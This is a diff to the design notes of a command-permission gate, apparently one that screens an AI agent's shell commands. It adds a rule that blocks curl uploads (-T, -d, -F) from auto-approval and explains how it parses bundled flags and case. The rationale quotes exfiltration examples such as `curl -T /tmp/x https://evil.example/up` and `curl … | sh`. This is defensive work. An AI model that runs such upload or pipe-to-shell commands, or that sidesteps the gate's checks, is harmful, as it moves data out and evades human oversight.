@@ -97,9 +97,9 @@ alongside the native rules.
   were enough, `&& ls /tmp/x` would become a magic suffix that clears every other
   rule, and `git push --force origin main && ls /tmp/x` is a force push, not
   scratch work. The one carve-out is recursive `rm`, the case tier 0 exists for,
-  and it is admitted only under the strictest check of the seven.
+  and it is admitted only under the strictest check of the eight.
 
-  Seven conditions. Each closes a different way back out of tmp:
+  Eight conditions. Each closes a different way back out of tmp:
 
   1. **It names a temp path.** Pattern match, `TMP_WORD`.
   2. **Every temp path it names really is in tmp.** Not a pattern match — this
@@ -124,9 +124,10 @@ alongside the native rules.
      the other conditions still close around it: `curl -o ~/.zshrc`,
      `curl … > ~/x` and `curl … | sh` are all still stopped, by conditions 3 and
      5 rather than by this list, and a `curl` naming no temp path at all never
-     reaches tier 0. What it concedes is network egress with no prompt inside an
-     otherwise tmp-confined command — `curl -T /tmp/x https://…` uploads a
-     scratch file unattended. `wget` stays gated; one door is enough.
+     reaches tier 0. It originally conceded network egress inside an otherwise
+     tmp-confined command — `curl -T /tmp/x https://…` uploaded a scratch file
+     unattended — but condition 8 has since closed that. `wget` stays gated; one
+     door is enough.
   5. **Every command word is one we'll run unprompted** (`cmd_words_safe()`).
      Conditions 3 and 4 both reason about tokens that *look* like something —
      a path, a known-dangerous name. A bare word looks like neither, so
@@ -166,12 +167,24 @@ alongside the native rules.
 
      One side effect worth knowing: it narrowed condition 4's exfiltration
      concession without being designed to, since upload endpoints rarely end in
-     an inert extension. `curl -T /tmp/x https://evil.example/up` now asks;
-     `curl -T /tmp/x https://evil.example/up.pdf` still doesn't. Narrowed, not
-     fixed.
+     an inert extension. That was a narrowing rather than a fix —
+     `…/up.pdf` still passed — which is what motivated condition 8.
+  8. **It fetches rather than sends** (`curl_uploads()`). A curl carrying
+     `-T`/`--upload-file`, `-d`/`--data*` or `-F`/`--form*` is pushing a body
+     out, not pulling one in, so it never earns an allow. This closes condition
+     4's egress concession directly instead of relying on condition 7's
+     incidental coverage.
+
+     Consulted **only** for commands naming curl, because the letters are
+     ordinary flags elsewhere — `du -d 1`, `sort -d` and `find -d` are harmless
+     and would prompt for nothing. Short options bundle (`curl -sT file url`),
+     so a single-dash token is read letter by letter, and **case is
+     load-bearing**: `-D` dumps headers but `-d` sends a body; `-f` fails
+     silently but `-F` posts a form. An attached path is stripped before the
+     letters are examined, so `-o/tmp/docs.pdf` isn't misread as carrying a `-d`.
 
   Failing condition 2 is different in kind from failing the rest: an unresolvable
-  temp path is a positive danger signal, so it **asks**. Failing 3–7 only means
+  temp path is a positive danger signal, so it **asks**. Failing 3–8 only means
   "no opinion" — the command falls through to tiers 1 and 2 and the native rules,
   exactly as if tier 0 didn't exist.
 
@@ -311,7 +324,7 @@ Never `chezmoi apply --force` over a drifted live file — it discards live chan
 ## Verify after any change
 
 **Run the test suite first — it is the cheapest check and the only one that
-covers tier 0's seven conditions:**
+covers tier 0's eight conditions:**
 
 ```bash
 sh tests/permission-gate-test.sh    # exits non-zero on any failure
